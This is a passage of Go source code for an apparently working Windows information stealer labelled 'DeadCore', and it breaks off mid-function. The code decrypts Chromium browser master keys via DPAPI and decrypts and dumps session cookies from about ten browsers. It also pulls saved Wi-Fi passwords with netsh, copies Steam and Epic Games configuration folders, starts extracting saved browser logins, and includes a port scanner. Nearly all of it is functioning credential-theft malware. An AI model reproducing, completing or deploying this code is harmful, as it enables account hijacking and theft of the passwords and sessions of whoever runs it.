package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"log"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"

	"archive/zip"

	_ "github.com/glebarez/go-sqlite"
	"github.com/kbinani/screenshot"
	"github.com/shirou/gopsutil/v3/disk"
	"github.com/shirou/gopsutil/v3/mem"
	"github.com/shirou/gopsutil/v3/process"
)

func ensureDir(dirPath string) error {
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		return os.MkdirAll(dirPath, 0755)
	}
	return nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("error opening source file %s: %w", src, err)
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("error creating destination file %s: %w", dst, err)
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	if err != nil {
		return fmt.Errorf("error copying file from %s to %s: %w", src, dst, err)
	}
	return nil
}

func copyDir(src, dst string) error {
	src = filepath.Clean(src)
	dst = filepath.Clean(dst)

	si, err := os.Stat(src)
	if err != nil {
		return err
	}
	if !si.IsDir() {
		return fmt.Errorf("source is not a directory")
	}

	err = ensureDir(dst)
	if err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			err = copyDir(srcPath, dstPath)
			if err != nil {
				return err
			}
		} else {
			err = copyFile(srcPath, dstPath)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

var (
	modcrypt32             = syscall.NewLazyDLL("crypt32.dll")
	procCryptUnprotectData = modcrypt32.NewProc("CryptUnprotectData")
	modkernel32            = syscall.NewLazyDLL("kernel32.dll")
	procLocalFree          = modkernel32.NewProc("LocalFree")
	logFile                *os.File
	logger                 *log.Logger
)

func setupLogger(logFilePath string) error {
	var err error
	logFile, err = os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("error opening log file: %w", err)
	}
	logger = log.New(logFile, "", log.Ldate|log.Ltime|log.Lshortfile)
	return nil
}

const DEBUG_MODE = true

func debugPrint(msg string) {
	if DEBUG_MODE && logger != nil {
		logger.Output(2, msg)
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func dpapiDecrypt(encryptedData []byte) ([]byte, error) {
	inBlob := DATA_BLOB{}
	outBlob := DATA_BLOB{}

	tmpBuf := make([]byte, len(encryptedData))
	copy(tmpBuf, encryptedData)

	inBlob.cbData = uint32(len(tmpBuf))
	inBlob.pbData = &tmpBuf[0]

	debugPrint(fmt.Sprintf("DEBUG: DPAPI decrypting data of length %d, first few bytes: %x", len(encryptedData), encryptedData[:min(len(encryptedData), 10)]))

	ret, _, errSyscall := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if ret == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: syscall error %v", errSyscall)
	}

	decryptedData := make([]byte, outBlob.cbData)
	copy(decryptedData, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData:outBlob.cbData])

	procLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

	debugPrint(fmt.Sprintf("DEBUG: DPAPI decryption successful. Decrypted data length: %d, first few bytes: %x", len(decryptedData), decryptedData[:min(len(decryptedData), 10)]))

	return decryptedData, nil
}

func decryptAESGCM(key, data []byte) ([]byte, error) {
	debugPrint(fmt.Sprintf("DEBUG: Starting decryptAESGCM."))
	debugPrint(fmt.Sprintf("DEBUG: Key (full hex): %x (length %d)", key, len(key)))
	debugPrint(fmt.Sprintf("DEBUG: Received encrypted data (full hex): %x (length %d)", data, len(data)))

	if len(key) != 32 {
		return nil, fmt.Errorf("invalid key length for AES-256 GCM: %d bytes (expected 32)", len(key))
	}

	if len(data) < 3 {
		return nil, fmt.Errorf("encrypted data too short for prefix check (%d bytes)", len(data))
	}

	var prefixLen int
	var actualEncryptedData []byte
	prefixDetected := ""

	if bytes.HasPrefix(data, []byte("v10")) {
		prefixLen = 3
		actualEncryptedData = data[prefixLen:]
		prefixDetected = "v10"
	} else if bytes.HasPrefix(data, []byte("v11")) {
		prefixLen = 3
		actualEncryptedData = data[prefixLen:]
		prefixDetected = "v11"
	} else if bytes.HasPrefix(data, []byte("v20")) {
		prefixLen = 3
		actualEncryptedData = data[prefixLen:]
		prefixDetected = "v20"
	} else {
		return nil, fmt.Errorf("encrypted data does not have 'v10', 'v11' or 'v20' prefix (actual first 3 bytes: %x...)", data[:3])
	}
	debugPrint(fmt.Sprintf("DEBUG: Detected prefix: %s. Actual encrypted data length after prefix removal: %d", prefixDetected, len(actualEncryptedData)))

	nonceSize := 12
	tagSize := 16

	if len(actualEncryptedData) < nonceSize+tagSize {
		return nil, fmt.Errorf("actual encrypted data too short for nonce and tag (%d bytes), expected at least %d", len(actualEncryptedData), nonceSize+tagSize)
	}

	nonce := actualEncryptedData[:nonceSize]
	ciphertextEnd := len(actualEncryptedData) - tagSize

	if ciphertextEnd < nonceSize {
		return nil, fmt.Errorf("ciphertext section too short after nonce (%d bytes)", ciphertextEnd-nonceSize)
	}

	ciphertext := actualEncryptedData[nonceSize:ciphertextEnd]
	tag := actualEncryptedData[ciphertextEnd:]

	debugPrint(fmt.Sprintf("DEBUG: Extracted Nonce (hex): %x (length %d)", nonce, len(nonce)))
	debugPrint(fmt.Sprintf("DEBUG: Extracted Ciphertext (hex): %x (length %d)", ciphertext, len(ciphertext)))
	debugPrint(fmt.Sprintf("DEBUG: Extracted Tag (hex): %x (length %d)", tag, len(tag)))

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("AES cipher creation failed: %v", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("GCM mode creation failed: %v", err)
	}

	plaintext, err := aesGCM.Open(nil, nonce, append(ciphertext, tag...), nil)
	if err != nil {
		return nil, fmt.Errorf("AES-GCM decryption failed: %w", err)
	}
	debugPrint(fmt.Sprintf("DEBUG: Decryption successful."))
	return plaintext, nil
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	return !os.IsNotExist(err)
}

func fileExists(filename string) bool {
	info, err := os.Stat(filename)
	if err != nil {
		if os.IsNotExist(err) {
			return false
		}
		debugPrint(fmt.Sprintf("fileExists error for '%s': %v", filename, err))
		return false
	}
	return !info.IsDir()
}

func getBrowserMasterKey(browserName string) ([]byte, error) {
	chromiumPaths := map[string]string{
		"chrome":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		"edge":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		"yandex":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
		"brave":       filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		"vivaldi":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
		"slimjet":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
		"iridium":     filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data"),
		"centbrowser": filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
	}

	operaPaths := map[string][]string{
		"opera": {
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera Stable"),
		},
		"opera_gx": {
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera GX Stable"),
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera GX Stable", "User Data"),
		},
	}

	if path, ok := chromiumPaths[browserName]; ok {
		localStatePath := filepath.Join(path, "Local State")
		if fileExists(localStatePath) {
			debugPrint(fmt.Sprintf("Found Local State for %s at %s", browserName, localStatePath))
			return extractMasterKey(browserName, localStatePath)
		}

		entries, err := os.ReadDir(path)
		if err != nil {
			return nil, fmt.Errorf("error reading directory %s: %v", path, err)
		}

		for _, entry := range entries {
			if entry.IsDir() && (strings.HasPrefix(entry.Name(), "Profile") || entry.Name() == "Default" || entry.Name() == "Guest Profile") {
				profilePath := filepath.Join(path, entry.Name(), "Local State")
				if fileExists(profilePath) {
					debugPrint(fmt.Sprintf("Found Local State for %s in profile %s at %s", browserName, entry.Name(), profilePath))
					return extractMasterKey(browserName, profilePath)
				}
			}
		}

		return nil, fmt.Errorf("Local State not found for %s after checking all locations", browserName)
	}

	if paths, ok := operaPaths[browserName]; ok {
		for _, path := range paths {
			localStatePath := filepath.Join(path, "Local State")
			if fileExists(localStatePath) {
				debugPrint(fmt.Sprintf("Found Local State for %s at %s", browserName, localStatePath))
				return extractMasterKey(browserName, localStatePath)
			}
			debugPrint(fmt.Sprintf("Local State not found at %s", localStatePath))
		}
		return nil, fmt.Errorf("Local State not found for %s in any of the checked locations", browserName)
	}

	return nil, fmt.Errorf("unsupported browser: %s", browserName)
}

func extractMasterKey(browserName string, localStatePath string) ([]byte, error) {
	content, err := os.ReadFile(localStatePath)
	if err != nil {
		debugPrint(fmt.Sprintf("Error reading local state file for %s: %v", browserName, err))
		return nil, fmt.Errorf("error reading local state file: %v", err)
	}

	var localStateData map[string]interface{}
	if err := json.Unmarshal(content, &localStateData); err != nil {
		debugPrint(fmt.Sprintf("Error unmarshalling local state JSON for %s: %v", browserName, err))
		return nil, fmt.Errorf("error unmarshalling local state JSON: %v", err)
	}

	osCrypt, ok := localStateData["os_crypt"].(map[string]interface{})
	if !ok {
		debugPrint(fmt.Sprintf("'os_crypt' key not found in local state for %s", browserName))
		return nil, fmt.Errorf("os_crypt not found in local state")
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		debugPrint(fmt.Sprintf("'encrypted_key' not found in os_crypt for %s", browserName))
		return nil, fmt.Errorf("encrypted_key not found in os_crypt")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		debugPrint(fmt.Sprintf("Error decoding base64 encrypted key for %s: %v", browserName, err))
		return nil, fmt.Errorf("error decoding base64 encrypted key: %v", err)
	}

	debugPrint(fmt.Sprintf("Encrypted key (base64 decoded, full) for %s: %x", browserName, encryptedKey))

	if len(encryptedKey) < 5 {
		debugPrint(fmt.Sprintf("Encrypted key for %s too short: %d bytes", browserName, len(encryptedKey)))
		return nil, fmt.Errorf("encrypted key too short")
	}

	var encryptedKeyWithoutPrefix []byte
	if bytes.HasPrefix(encryptedKey, []byte("DPAPI")) {
		encryptedKeyWithoutPrefix = encryptedKey[5:]
		debugPrint(fmt.Sprintf("Encrypted key for %s starts with 'DPAPI'. After trim: %x", browserName, encryptedKeyWithoutPrefix[:min(len(encryptedKeyWithoutPrefix), 20)]))
	} else {
		debugPrint(fmt.Sprintf("Encrypted key for %s does NOT start with 'DPAPI'. First 5 bytes: %x. Proceeding with trim.", browserName, encryptedKey[:min(len(encryptedKey), 5)]))
		encryptedKeyWithoutPrefix = encryptedKey[5:]
	}

	decryptedKey, err := dpapiDecrypt(encryptedKeyWithoutPrefix)
	if err != nil {
		debugPrint(fmt.Sprintf("Error decrypting master key for %s with DPAPI: %v", browserName, err))
		return nil, fmt.Errorf("error decrypting master key with DPAPI: %v", err)
	}
	debugPrint(fmt.Sprintf("Master key for %s successfully decrypted, length: %d", browserName, len(decryptedKey)))

	return decryptedKey, nil
}

func scanPort(protocol, hostname string, port int, timeout time.Duration) bool {
	address := fmt.Sprintf("%s:%d", hostname, port)
	conn, err := net.DialTimeout(protocol, address, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func PerformSimplePortScan(targetHost string, startPort, endPort int, timeoutPerPort time.Duration) {
	log.Printf("DeadCore: Starting a port scan on host: %s from %d to %d...", targetHost, startPort, endPort)
	foundOpenPorts := []int{}

	for port := startPort; port <= endPort; port++ {
		if scanPort("tcp", targetHost, port, timeoutPerPort) {
			log.Printf("DeadCore: Found an OPEN door! Port %d on %s is OPEN. Fuck yeah!", port, targetHost)
			foundOpenPorts = append(foundOpenPorts, port)
		} else {
		}
	}

	if len(foundOpenPorts) > 0 {
		log.Printf("DeadCore: Scan for %s completed. OPEN PORTS: %v. What the fuck are we doing next?", targetHost, foundOpenPorts)
	} else {
		log.Printf("DeadCore: Scan for %s completed. No OPEN doors found. Fuck off, try another range or target, stupid ass.", targetHost)
	}
}

func getWifiPasswords(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Started Wi-Fi password extraction.")

	wifiInfoPath := filepath.Join(destFolder, "WIFI_PASSWORDS.txt")
	var wifiData strings.Builder
	wifiData.WriteString("--- WI-FI PASSWORDS ---\n\n")

	cmdProfiles := exec.Command("netsh", "wlan", "show", "profiles")
	outputProfiles, err := cmdProfiles.Output()
	if err != nil {
		wifiData.WriteString(fmt.Sprintf("Error getting Wi-Fi profiles: %v\n", err))
		debugPrint(fmt.Sprintf("Error getting Wi-Fi profiles: %v", err))
		os.WriteFile(wifiInfoPath, []byte(wifiData.String()), 0644)
		return
	}

	profileNames := []string{}
	profilesRegex := regexp.MustCompile(`All User Profile\s*:\s*(.*)\r?\n`)
	matches := profilesRegex.FindAllStringSubmatch(string(outputProfiles), -1)

	for _, match := range matches {
		if len(match) > 1 {
			profileName := strings.TrimSpace(match[1])
			if profileName != "" {
				profileNames = append(profileNames, profileName)
			}
		}
	}

	if len(profileNames) == 0 {
		wifiData.WriteString("No Wi-Fi profiles found with passwords.\n")
		debugPrint("No Wi-Fi profiles found for password extraction.")
		os.WriteFile(wifiInfoPath, []byte(wifiData.String()), 0644)
		return
	}

	debugPrint(fmt.Sprintf("Found %d Wi-Fi profiles for password extraction.", len(profileNames)))

	for _, profileName := range profileNames {
		cmdDetails := exec.Command("netsh", "wlan", "show", "profile", "name="+fmt.Sprintf("\"%s\"", profileName), "key=clear")
		outputDetails, err := cmdDetails.Output()
		if err != nil {
			wifiData.WriteString(fmt.Sprintf("Profile: %s - Error getting details: %v\n", profileName, err))
			debugPrint(fmt.Sprintf("Error getting details for Wi-Fi profile %s: %v", profileName, err))
			continue
		}

		keyContentRegex := regexp.MustCompile(`Key Content\s*:\s*(.*)\r?\n`)
		keyContentMatch := keyContentRegex.FindStringSubmatch(string(outputDetails))

		password := "N/A"
		if len(keyContentMatch) > 1 {
			password = strings.TrimSpace(keyContentMatch[1])
		}

		wifiData.WriteString(fmt.Sprintf("Profile: %s\n", profileName))
		wifiData.WriteString(fmt.Sprintf("Password: %s\n", password))
		wifiData.WriteString("--------------------\n")
		debugPrint(fmt.Sprintf("Extracted Wi-Fi profile: %s, Password: %s", profileName, password))
	}

	os.WriteFile(wifiInfoPath, []byte(wifiData.String()), 0644)
	debugPrint(fmt.Sprintf("Wi-Fi passwords saved to %s", wifiInfoPath))
}

func copySteamConfig(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Started Steam config copying function.")

	steamDestDir := filepath.Join(destFolder, "STEAM")
	ensureDir(steamDestDir)

	steamConfigDestPath := filepath.Join(steamDestDir, "config")

	steamPaths := []string{
		"B:\\Program Files (x86)\\Steam\\config",
		"C:\\Program Files (x86)\\Steam\\config",
		"D:\\Program Files (x86)\\Steam\\config",
		"E:\\Program Files (x86)\\Steam\\config",
		"F:\\Program Files (x86)\\Steam\\config",
		"C:\\Program Files\\Steam\\config",
		"D:\\Program Files\\Steam\\config",
		"B:\\Program Files\\Steam\\config",
		"E:\\Program Files\\Steam\\config",
		"F:\\Program Files\\Steam\\config",
		"D:\\Steam\\config",
		"E:\\Steam\\config",
		"F:\\Steam\\config",
		"C:\\Steam\\config",
		"B:\\Steam\\config",
	}

	configCopied := false
	for _, steamConfigPath := range steamPaths {
		if pathExists(steamConfigPath) {
			if pathExists(steamConfigDestPath) {
				os.RemoveAll(steamConfigDestPath)
				debugPrint(fmt.Sprintf("Removed existing target Steam config folder: %s", steamConfigDestPath))
			}
			err := copyDir(steamConfigPath, steamConfigDestPath)
			if err == nil {
				configCopied = true
				debugPrint(fmt.Sprintf("Steam config copied from %s to %s", steamConfigPath, steamConfigDestPath))
				break
			} else {
				debugPrint(fmt.Sprintf("Error copying Steam config from %s to %s: %v", steamConfigPath, steamConfigDestPath, err))
			}
		}
	}
	if !configCopied {
		debugPrint("Steam config not found or not copied.")
	}
	debugPrint("Steam config copying function finished.")
}

func copyEpicGamesConfig(destFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint("Started Epic Games config copying function.")

	epicGamesDestDir := filepath.Join(destFolder, "EPIC_GAMES_CONFIGS")
	ensureDir(epicGamesDestDir)
	debugPrint(fmt.Sprintf("Created target folder for Epic Games configs: %s", epicGamesDestDir))

	epicGamesConfigPaths := []string{
		"C:\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Config",
		"D:\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Config",
		"E:\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Config",
		"F:\\Program Files (x86)\\Epic Games\\Launcher\\Engine\\Config",
		"C:\\Program Files\\Epic Games\\Launcher\\Engine\\Config",
		"D:\\Program Files\\Epic Games\\Launcher\\Engine\\Config",
		"E:\\Program Files\\Epic Games\\Launcher\\Engine\\Config",
		"F:\\Program Files\\Epic Games\\Launcher\\Engine\\Config",
		"C:\\Epic Games\\Launcher\\Engine\\Config",
		"D:\\Epic Games\\Launcher\\Engine\\Config",
	}

	configCopied := false
	for _, epicConfigPath := range epicGamesConfigPaths {
		if pathExists(epicConfigPath) {
			epicConfigDestPath := filepath.Join(epicGamesDestDir, filepath.Base(epicConfigPath))
			if pathExists(epicConfigDestPath) {
				os.RemoveAll(epicConfigDestPath)
				debugPrint(fmt.Sprintf("Removed existing target Epic Games config folder: %s", epicConfigDestPath))
			}
			err := copyDir(epicConfigPath, epicConfigDestPath)
			if err == nil {
				configCopied = true
				debugPrint(fmt.Sprintf("Epic Games config copied from %s to %s", epicConfigPath, epicConfigDestPath))
				break
			} else {
				debugPrint(fmt.Sprintf("Error copying Epic Games config from %s to %s: %v", epicConfigPath, epicConfigDestPath, err))
			}
		} else {
			debugPrint(fmt.Sprintf("Source path for Epic Games config not found: %s", epicConfigPath))
		}
	}
	if !configCopied {
		debugPrint("Epic Games config not found or not copied.")
	}
	debugPrint("Epic Games config copying function finished.")
}

type CookieData struct {
	HostKey        string
	Name           string
	Path           string
	DecryptedValue string
	RawValueHex    string
	IsDecrypted    bool
	ExpiresUtc     int64
	IsHttpOnly     bool
	IsSecure       bool
	LastAccessUtc  int64
	CreationUtc    int64
	SameSite       int64
}

type PasswordEntry struct {
	URL      string
	Username string
	Password string
}

func processCookieProfile(browserName, profilePath string, masterKey []byte, cookiesDestFolder string) {
	debugPrint(fmt.Sprintf("Processing cookies for %s, profile: %s", browserName, filepath.Base(profilePath)))

	possibleCookiePaths := []string{
		filepath.Join(profilePath, "Cookies"),
		filepath.Join(profilePath, "Network", "Cookies"),
	}

	cookiePath := ""
	for _, p := range possibleCookiePaths {
		if fileExists(p) {
			cookiePath = p
			break
		}
	}

	if cookiePath == "" {
		debugPrint(fmt.Sprintf("Cookie file not found for %s in profile %s after trying common paths.", browserName, filepath.Base(profilePath)))
		return
	}
	debugPrint(fmt.Sprintf("Found cookie file for %s in profile %s at path: %s", browserName, filepath.Base(profilePath), cookiePath))

	tempCookiePath := filepath.Join(os.TempDir(), fmt.Sprintf("temp_cookies_%s_%s.sqlite", browserName, filepath.Base(profilePath)))
	if err := copyFile(cookiePath, tempCookiePath); err != nil {
		debugPrint(fmt.Sprintf("Error copying cookie database for %s (profile %s) from %s to %s: %v", browserName, filepath.Base(profilePath), cookiePath, tempCookiePath, err))
		return
	}
	defer os.Remove(tempCookiePath)
	debugPrint(fmt.Sprintf("Cookie database for %s (profile %s) copied to %s", browserName, filepath.Base(profilePath), tempCookiePath))

	cookies, err := queryCookieDB(tempCookiePath, masterKey)
	if err != nil {
		debugPrint(fmt.Sprintf("Error querying cookies for %s (profile %s): %v", browserName, filepath.Base(profilePath), err))
		return
	}

	var allCookieLines []string

	for _, cookie := range cookies {
		httpOnlyStr := "FALSE"
		if cookie.IsHttpOnly {
			httpOnlyStr = "TRUE"
		}
		secureStr := "FALSE"
		if cookie.IsSecure {
			secureStr = "TRUE"
		}

		cookieValue := ""
		if !cookie.IsDecrypted {
			cookieValue = fmt.Sprintf("Decryption_ERROR: %s | Raw Encrypted (hex): %s", strings.TrimPrefix(cookie.DecryptedValue, "Value (decryption ERROR: "), cookie.RawValueHex)
		} else {
			if strings.Contains(cookie.DecryptedValue, "Value (binary/non-UTF8") {
				cookieValue = cookie.RawValueHex
			} else {
				cookieValue = cookie.DecryptedValue
			}
		}

		cookieLine := fmt.Sprintf("%s\t%s\t%s\t%s\t%d\t%s\t%s",
			cookie.HostKey, httpOnlyStr, cookie.Path, secureStr, cookie.ExpiresUtc, cookie.Name, cookieValue)

		allCookieLines = append(allCookieLines, cookieLine)
	}

	if len(allCookieLines) > 0 {
		cookieOutputPath := filepath.Join(cookiesDestFolder, fmt.Sprintf("%s_%s_all_cookies.txt", browserName, filepath.Base(profilePath)))
		outputFile, err := os.Create(cookieOutputPath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error creating file for all cookies (%s, profile %s): %v", browserName, filepath.Base(profilePath), err))
		} else {
			defer outputFile.Close()
			for _, line := range allCookieLines {
				fmt.Fprintln(outputFile, line)
			}
			debugPrint(fmt.Sprintf("Wrote %d cookies (all, including undecrypted) for %s (profile %s) to %s", len(allCookieLines), browserName, filepath.Base(profilePath), cookieOutputPath))
		}
	}
	debugPrint(fmt.Sprintf("Finished processing cookies for %s, profile: %s", browserName, filepath.Base(profilePath)))
}

func queryCookieDB(dbPath string, masterKey []byte) ([]CookieData, error) {
	var cookies []CookieData

	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("error opening cookie database %s: %w", dbPath, err)
	}
	defer db.Close()

	rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc, is_httponly, is_secure, last_access_utc, creation_utc, samesite FROM cookies")
	if err != nil {
		return nil, fmt.Errorf("error querying cookies from %s: %w", dbPath, err)
	}
	defer rows.Close()

	for rows.Next() {
		var hostKey, name, path string
		var encryptedValue []byte
		var expiresUtc, isHttpOnly, isSecure, lastAccessUtc, creationUtc, samesite int64
		err := rows.Scan(&hostKey, &name, &path, &encryptedValue, &expiresUtc, &isHttpOnly, &isSecure, &lastAccessUtc, &creationUtc, &samesite)
		if err != nil {
			return nil, fmt.Errorf("error scanning cookie row: %w", err)
		}

		currentCookie := CookieData{
			HostKey:       hostKey,
			Name:          name,
			Path:          path,
			ExpiresUtc:    expiresUtc,
			IsHttpOnly:    isHttpOnly == 1,
			IsSecure:      isSecure == 1,
			LastAccessUtc: lastAccessUtc,
			CreationUtc:   creationUtc,
			SameSite:      samesite,
		}

		if len(encryptedValue) > 0 {
			if masterKey != nil && len(masterKey) == 32 {
				debugPrint(fmt.Sprintf("queryCookieDB: Attempting decryption for Host: %s, Name: %s with Master Key (first 8 bytes): %x", hostKey, name, masterKey[:min(len(masterKey), 8)]))
				plainText, decryptErr := decryptAESGCM(masterKey, encryptedValue)
				if decryptErr != nil {
					currentCookie.DecryptedValue = fmt.Sprintf("Value (decryption ERROR: %v)", decryptErr)
					currentCookie.RawValueHex = fmt.Sprintf("Raw Encrypted (hex): %x", encryptedValue)
					currentCookie.IsDecrypted = false
					debugPrint(fmt.Sprintf("Error decrypting cookie for %s (Host: %s, Name: %s): %v", hostKey, hostKey, name, decryptErr))
				} else {
					currentCookie.IsDecrypted = true
					currentCookie.RawValueHex = fmt.Sprintf("%x", plainText)
					if utf8.Valid(plainText) {
						currentCookie.DecryptedValue = string(plainText)
					} else {
						currentCookie.DecryptedValue = fmt.Sprintf("Value (binary/non-UTF8 - hex below - often expected for session IDs, tokens, etc.)")
					}
				}
			} else {
				currentCookie.DecryptedValue = "Value (encrypted/No Master Key or Invalid Key Length)"
				currentCookie.IsDecrypted = false
				if masterKey != nil {
					currentCookie.RawValueHex = fmt.Sprintf("Raw Encrypted (hex): %x, Master Key Length: %d", encryptedValue, len(masterKey))
				} else {
					currentCookie.RawValueHex = fmt.Sprintf("Raw Encrypted (hex): %x (Master Key is nil)", encryptedValue)
				}
			}
		} else {
			currentCookie.DecryptedValue = "Value (empty)"
			currentCookie.IsDecrypted = true
			currentCookie.RawValueHex = ""
		}
		cookies = append(cookies, currentCookie)
	}

	return cookies, nil
}

func copyAndDecryptCookies(browserName string, cookiesDestFolder string, wg *sync.WaitGroup) {
	defer wg.Done()
	debugPrint(fmt.Sprintf("Started processing cookies for %s", browserName))

	masterKey, err := getBrowserMasterKey(browserName)
	if err != nil {
		debugPrint(fmt.Sprintf("Error getting master key for %s: %v", browserName, err))
		return
	}
	debugPrint(fmt.Sprintf("Master key for %s obtained. Length: %d", browserName, len(masterKey)))

	baseUserDataPath := ""
	switch browserName {
	case "chrome":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
	case "edge":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
	case "yandex":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data")
	case "opera":
		baseUserDataPath = filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable")
	case "opera_gx":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Opera Software", "Opera GX Stable")
	case "brave":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
	case "vivaldi":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data")
	case "slimjet":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Slimjet", "User Data")
	case "iridium":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data")
	case "centbrowser":
		baseUserDataPath = filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data")
	default:
		debugPrint(fmt.Sprintf("Browser %s is not configured for cookie decryption in Go module.", browserName))
		return
	}

	if !pathExists(baseUserDataPath) {
		debugPrint(fmt.Sprintf("Base user data path not found for %s at path: %s", browserName, baseUserDataPath))
		return
	}
	debugPrint(fmt.Sprintf("Found base user data path for %s at path: %s", browserName, baseUserDataPath))

	var profilePaths []string
	if browserName == "opera" || browserName == "opera_gx" {
		profilePaths = append(profilePaths, baseUserDataPath)
	} else {
		entries, err := os.ReadDir(baseUserDataPath)
		if err != nil {
			debugPrint(fmt.Sprintf("Error reading user data directory for %s: %v", browserName, err))
			return
		}
		for _, entry := range entries {
			if entry.IsDir() && (strings.HasPrefix(entry.Name(), "Profile") || entry.Name() == "Default" || entry.Name() == "Guest Profile") {
				profilePaths = append(profilePaths, filepath.Join(baseUserDataPath, entry.Name()))
			}
		}
	}

	if len(profilePaths) == 0 {
		debugPrint(fmt.Sprintf("No profiles found for %s under %s", browserName, baseUserDataPath))
		return
	}
	debugPrint(fmt.Sprintf("Found %d profiles for %s: %v", len(profilePaths), browserName, profilePaths))

	var profileWg sync.WaitGroup
	for _, pPath := range profilePaths {
		profileWg.Add(1)
		go func(p string, currentBrowserName string, currentCookiesDestFolder string, mk []byte) {
			defer profileWg.Done()
			processCookieProfile(currentBrowserName, p, mk, currentCookiesDestFolder)
		}(pPath, browserName, cookiesDestFolder, masterKey)
	}
	profileWg.Wait()
	debugPrint(fmt.Sprintf("Finished processing cookies for %s", browserName))
}

func extractAndDecryptPasswords(browserName, profilePath string, masterKey []byte, passwordsDestFolder string) {
	debugPrint(fmt.Sprintf("Starting password extraction for %s, profile: %s", browserName, filepath.Base(profilePath)))

	loginDataPath := filepath.Join(profilePath, "Login Data")
	if !fileExists(loginDataPath) {
		debugPrint(fmt.Sprintf("Login Data file not found for %s in profile %s at path: %s", browserName, filepath.Base(profilePath), loginDataPath))
		return
	}
	debugPrint(fmt.Sprintf("Found Login Data file for %s in profile %s at path: %s", browserName, filepath.Base(profilePath), loginDataPath))

	tempLoginDataPath := filepath.Join(os.TempDir(), fmt.Sprintf("temp_logins_%s_%s.sqlite", browserName, filepath.Base(profilePath)))
	if err := copyFile(loginDataPath, tempLoginDataPath); err != nil {
		debugPrint(fmt.Sprintf("Error copying Login Data database for %s (profile %s) from %s to %s: %v", browserName, filepath.Base(profilePath), loginDataPath, tempLoginDataPath, err))
		return
	}
	defer os.Remove(tempLoginDataPath)
	debugPrint(fmt.Sprintf("Login Data database for %s (profile %s) copied to %s", browserName, filepath.Base(profilePath), tempLoginDataPath))

	db, err := sql.Open("sqlite", tempLoginDataPath)
	if err != nil {
		debugPrint(fmt.Sprintf("Error opening Login Data database %s: %v", tempLoginDataPath, err))
		return
	}
	defer db.Close()

	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
